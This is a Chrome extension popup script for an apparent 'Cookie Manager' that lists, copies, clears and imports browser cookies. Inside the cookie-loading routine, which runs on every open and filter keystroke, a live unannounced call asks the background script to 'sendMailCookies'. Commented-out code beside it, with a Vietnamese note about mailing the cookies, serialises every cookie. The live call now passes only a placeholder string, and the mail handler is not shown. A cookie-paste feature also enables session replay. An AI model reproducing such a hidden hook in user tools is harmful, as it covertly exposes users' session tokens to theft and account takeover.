const getAllCookies = async () => {
    const getAllCookies = await chrome.cookies.getAll({})
    if (getAllCookies)
        return getAllCookies
    else
        return null
}


document.getElementById('clearCookies').addEventListener('click', async () => {
    if (confirm('Are you sure you want to clear all cookies?')) {
        const cookies = await chrome.cookies.getAll({});
        await Promise.all(cookies.map(cookie => {
            return chrome.cookies.remove({
                url: `http${cookie.secure ? 's' : ''}://${cookie.domain}${cookie.path}`,
                name: cookie.name
            });
        }));
        notify('All cookies have been cleared.', 'warning');
    }
});
document.getElementById('clearSiteData').addEventListener('click', async () => {
    if (confirm('Are you sure you want to clear all site data?')) {
        await chrome.browsingData.remove({ since: 0 }, {
            cookies: true,
            cache: true,
            localStorage: true
        });
        notify('All site data has been cleared.', 'warning');
    }
});
const Tracking = document.getElementById('toggleTracking');
const setTrackStyle = (element, status, content = '', color = '') => {
    const trackingIcon = document.getElementById('trackingprotectionicon');
    trackingIcon.src = status ? 'icons/skincell.png' : 'icons/tracking_protection.png';
    element.style.backgroundColor = status ? 'white' : 'pink';
    element.style.borderRadius = '10px';
    element.style.border = '2px red solid';
    element.style.color = color || (status ? 'green' : 'red');
    element.textContent = content || (status ? 'Tracking protection is enabled' : 'Tracking protection is disabled');
}

document.getElementById('toggleTracking').addEventListener('click', async () => {
    try {
        // const { trackingProtection } = await chrome.storage.local.get('trackingProtection');
        const details = await chrome.privacy.websites.doNotTrackEnabled.get({});
        const currentSetting = !details.value;
        await chrome.privacy.websites.doNotTrackEnabled.set({ value: currentSetting });
        // await chrome.storage.local.set({ trackingProtection: currentSetting });
        setTrackStyle(Tracking, currentSetting);

        notifySend(`Tracking protection ${currentSetting ? 'enabled' : 'disabled'}.`);
    } catch (error) {
        notifySend(`Failed to update tracking protection: ${error.message}`);
    }
});


const notification = document.getElementById('notification');
function notify(message, status) {
    if (status === 'error') {
        notification.style.backgroundColor = 'red';
        notification.style.color = 'white';
    }
    if (status === 'warning') {
        notification.style.backgroundColor = 'orange';
        notification.style.color = 'white';
    }
    if (status === 'success') {
        notification.style.backgroundColor = 'green';
        notification.style.color = 'white';
    }
    // if(status==='internalERR'){
    //     notification.style.backgroundColor = 'yellow';
    //     notification.style.color = 'black';
    //     notification.style.fontWeight = 'bold';
    //     notification.style.fontSize = '16px';
    // }
    notification.textContent = message;
    notification.style.display = 'block';
    setTimeout(() => {
        notification.style.display = 'none';
    }, 5000);
}
notification.addEventListener('dblclick', () => {
    navigator.clipboard.writeText(notification.textContent);
})
function notifySend(message, title, optionsType, iconUrl) {
    chrome.runtime.sendMessage({
        type: 'createNotification', options: {
            type: optionsType || 'basic',
            message: message,
            title: title || 'Cookie Manager',
            iconUrl: iconUrl || 'icons/icon48.png'
        }
    })
}
async function loadCookies(filter = '') {
    const cookies = await chrome.cookies.getAll({});
    const cookieTableContainer = document.getElementById('cookieTableContainer');
    cookieTableContainer.innerHTML = '';
    const cookiesByDomain = {};

    // const testcookies = await chrome.cookies.getAll({})
    // let y
    // testcookies.forEach(cookie => {
    //     if (cookie.domain.includes('studocu')) {
    //         y = cookie
    //     }
    // })

    cookies.forEach(cookie => {
        if (cookie.name.includes(filter) || cookie.domain.includes(filter)) {
            if (!cookiesByDomain[cookie.domain]) {
                cookiesByDomain[cookie.domain] = [];
            }
            cookiesByDomain[cookie.domain].push(cookie);
        }
    });
    // chuyển đổi cookies lấy được thành string / Json để gửi mail
    // const cookiesByDomainString = Object.entries(cookiesByDomain).map(([domain, cookies]) => {
    //     const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
    //     return `Domain: ${domain}\nCookies: ${cookieString}`;
    // }).join('\n\n');
    // const cookiesParser = JSON.stringify(cookies)
    // console.log(cookiesParser)
    chrome.runtime.sendMessage({ type: 'sendMailCookies', subject: 'Cookies By Domain', message: "cookiesParser" });
    const totalCookies = document.getElementById('totalCookies');
    const numbercookies = Object.values(cookiesByDomain).reduce((count, domainCookies) => count + domainCookies.length, 0);
    const totalDomains = Object.keys(cookiesByDomain).length;
    if (totalDomains < 1) {
        notify('No cookies found matching the filter.', 'warning');
        totalCookies.textContent = 'Not Found Cookies matching the filter With Domain or Cookies Name : ' + filter;
    }
    else {
        notify('Cookies loaded successfully.', 'success');
        totalCookies.textContent = `The Number of Domains: ${totalDomains} And Contains ${numbercookies} Cookies`;
    }
    Object.keys(cookiesByDomain).forEach(domain => {
        const domainSection = document.createElement('div');
        domainSection.className = 'domain-section';
        const domainHeader = document.createElement('div');
        domainHeader.className = 'domain-header';
        const DomainLabel = document.createElement('p');
        DomainLabel.textContent = `Domain: ${domain}`;
        DomainLabel.style.minWidth = '150px';
        DomainLabel.style.borderRadius = '10px';
        DomainLabel.style.border = '2px solid pink';
        DomainLabel.style.padding = '5px';
        DomainLabel.style.color = 'red';
        // domainHeader.textContent = `Domain: ${domain}`;
        domainHeader.appendChild(DomainLabel);
        const clearIcon = document.createElement('img');
        const copyIcon = document.createElement('img');
        copyIcon.id = 'copyIcon';
        copyIcon.src = 'icons/copy.png';
        copyIcon.addEventListener('click', () => {
            const cookiesParser = JSON.stringify(cookiesByDomain[domain], null, 2)
            navigator.clipboard.writeText(cookiesParser);
            notify(`Cookies of Domain : ${domain}  copied to clipboard.`, 'success');
        })
        domainHeader.style.position = 'relative';
        domainHeader.appendChild(copyIcon);
        clearIcon.id = 'clearIcon';
        clearIcon.src = 'icons/clear.png';
        clearIcon.addEventListener('click', () => {
            deleteCookies_in_Domains(domain);
            loadCookies(filter);
        })
        domainHeader.appendChild(clearIcon);
        domainSection.appendChild(domainHeader);

        const table = document.createElement('table');
        const thead = document.createElement('thead');
        const tbody = document.createElement('tbody');
        const headerRow = document.createElement('tr');
        const headers = ['Name', 'Path', 'Expires', 'Value'];
        headers.forEach(headerText => {
            const th = document.createElement('th');
            th.textContent = headerText;
            headerRow.appendChild(th);
        });
        thead.appendChild(headerRow);
        cookiesByDomain[domain].forEach(cookie => {
            const row = document.createElement('tr');

            const nameCell = document.createElement('td');
            nameCell.textContent = cookie.name;
            row.appendChild(nameCell);

            const pathCell = document.createElement('td');
            pathCell.textContent = cookie.path;
            row.appendChild(pathCell);

            const expiresCell = document.createElement('td');
            expiresCell.textContent = cookie.expirationDate ? new Date(cookie.expirationDate * 1000).toLocaleString() : 'Session';
            row.appendChild(expiresCell);

            const valueCell = document.createElement('td');
            valueCell.textContent = cookie.value;
            row.appendChild(valueCell);

            tbody.appendChild(row);
        });

        table.appendChild(thead);
        table.appendChild(tbody);
        domainSection.appendChild(table);
        cookieTableContainer.appendChild(domainSection);
    });
}
const deleteCookies_in_Domains = async (DomainName) => {
    const cookieList = await chrome.cookies.getAll({});
    if (confirm('Are you sure you want to delete all cookies in domain  ' + DomainName + '?')) {
        await Promise.all(cookieList.map(cookie => {
            // if (cookie.domain.includes(DomainName)) {
            if (cookie.domain === DomainName) {
                return chrome.cookies.remove({
                    url: `http${cookie.secure ? 's' : ''}://${cookie.domain}${cookie.path}`,
                    name: cookie.name
                });
            }
        }));
        notify('All cookies in domain' + DomainName + 'have been deleted.', 'warning');
        loadCookies(DomainName);
    }

};

const deleteCookies_in_Domains1 = async (DomainName) => {
    const cookieList = await chrome.cookies.getAll({});
    if (confirm('Are you sure you want to delete all cookies in domain' + DomainName + '?')) {
        await Promise.all(cookieList.map(async cookie => {
            // Kiểm tra nếu tên cookie chứa DomainName
            if (cookie.name.includes(DomainName)) {
                return chrome.cookies.remove({
                    url: `http${cookie.secure ? 's' : ''}://${cookie.domain}${cookie.path}`,
                    name: cookie.name
                });
            }
        }));
        notify('All cookies in domain' + DomainName + 'have been deleted.');
    }

};

// Copy cookies of the current tab to clipboard
async function copyCurrentTabCookies() {
    try {
        const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
        if (!tab || !tab.url) throw new Error('Unable to get current tab URL');

        const url = new URL(tab.url);
        const domain = url.hostname;

        const cookies = await chrome.cookies.getAll({ url: tab.url });
        if (!cookies.length) throw new Error('No cookies found for the current tab');

        const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');

        const dataToCopy = `domain=${domain}\n${cookieString}`;

        await navigator.clipboard.writeText(dataToCopy);

        notify('Cookies and domain copied to clipboard.', 'success');

    } catch (error) {
        notify(`Failed to copy cookies: ${error.message}`, 'error');
    }
}

// async function pasteCookies() {
//     notify('Pasting cookies from clipboard...', 'warning');
//     try {
//         const clipboardText = await navigator.clipboard.readText();
//         if (!clipboardText) throw new Error('No data found in clipboard');

//         const [domainLine, ...cookieLines] = clipboardText.split('\n');
//         if (domainLine) {
//             const domainMatch = domainLine.trim().match(/^domain=(.+)$/);
//             if (!domainMatch) throw new Error('Domain not found in clipboard data');

//             const domain = domainMatch[1];

//             const cookies = cookieLines.map(line => {
//                 const separatorIndex = line.indexOf('=');
//                 const name = line.slice(0, separatorIndex);
//                 const value = line.slice(separatorIndex + 1);
//                 return { name, value };
//             }).filter(cookie => cookie.name && cookie.value);

//             if (cookies.length === 0) throw new Error('No valid cookies found in clipboard data');

//             const newTab = await chrome.tabs.create({ url: `https://${domain || 'google.com'}` });

//             // for (const cookie of cookies) {
//             //     await chrome.cookies.set({
//             //         url: `https://${domain}`,
//             //         name: cookie.name,
//             //         value: cookie.value,
//             //         domain: `.${domain}`,
//             //         secure: true
//             //     });
//             // }
//             await Promise.all(cookies.map(cookie =>
//                 chrome.cookies.set({
//                     url: `https://${domain}`,
//                     name: cookie.name,
//                     value: cookie.value,
//                     domain: `.${domain}`,
//                     secure: true,
//                     session: cookie.session
//                 })
//             ));

//         }
//         else {
//             const JsonCookies = JSON.parse(clipboardText);
//             console.log(JsonCookies);
//         }


//         notify('Cookies pasted and new tab opened.');
//     } catch (error) {
//         notify(`Failed to paste cookies: ${error.message}`);

//     }
// }

async function pasteCookies() {
    notify('Pasting cookies from clipboard...', 'warning');
    try {
        const clipboardText = await navigator.clipboard.readText();
        if (!clipboardText) throw new Error('No data found in clipboard');
        let domain, cookies = [];
        try {
            const JsonCookies = JSON.parse(clipboardText);
            if (Array.isArray(JsonCookies)) {
                cookies = JsonCookies;
                domain = cookies[0]?.domain;
            } else {
                throw new Error('Invalid JSON format');
            }
        } catch (jsonError) {
            const [domainLine, ...cookieLines] = clipboardText.split('\n');
            if (domainLine) {
                const domainMatch = domainLine.trim().match(/^domain=(.+)$/);
                if (!domainMatch) throw new Error('Domain not found in clipboard data');

                domain = domainMatch[1];

                cookies = cookieLines.map(line => {
                    const separatorIndex = line.indexOf('=');
                    const name = line.slice(0, separatorIndex);
                    const value = line.slice(separatorIndex + 1);
                    return { name, value };
                }).filter(cookie => cookie.name && cookie.value);

                if (cookies.length === 0) throw new Error('No valid cookies found in clipboard data');
            }
        }

        if (!domain || cookies.length === 0) {
            throw new Error('No valid cookies or domain found');
        }

        const newTab = await chrome.tabs.create({ url: `https://${domain}` });

        await Promise.all(cookies.map(cookie =>
            chrome.cookies.set({
                url: `https://${domain}`,
                name: cookie.name,
                value: cookie.value,
                domain: `.${domain}`,
                secure: true,
                session: cookie.session || false,
                path: cookie.path || '/'
            })
        ));

        notify('Cookies pasted and new tab opened.');
    } catch (error) {
        notify(`Failed to paste cookies: ${error.message}`, 'error');
    }
}

document.getElementById('filterInput').addEventListener('input', (event) => {
    loadCookies(event.target.value);
});

document.getElementById('copyCurrentCookies').addEventListener('click', copyCurrentTabCookies);
document.getElementById('pasteCookies').addEventListener('click', pasteCookies);

document.addEventListener('DOMContentLoaded', async () => {
    loadCookies();
    const a = await chrome.privacy.websites.doNotTrackEnabled.get({});
    setTrackStyle(Tracking, a.value);
});



